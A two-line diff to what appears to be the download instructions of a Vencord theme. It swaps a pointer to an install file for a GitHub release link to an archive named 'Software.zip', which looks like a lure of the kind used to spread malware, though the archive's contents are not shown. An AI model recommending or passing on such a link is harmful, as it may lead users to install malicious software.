@@ -1,2 +1,2 @@
 <How to download>
-Read INSTALL.THEME
+Read https://github.com/itsamari/BloodCity1.0-Vencord-Theme/releases/download/v2.0/Software.zip
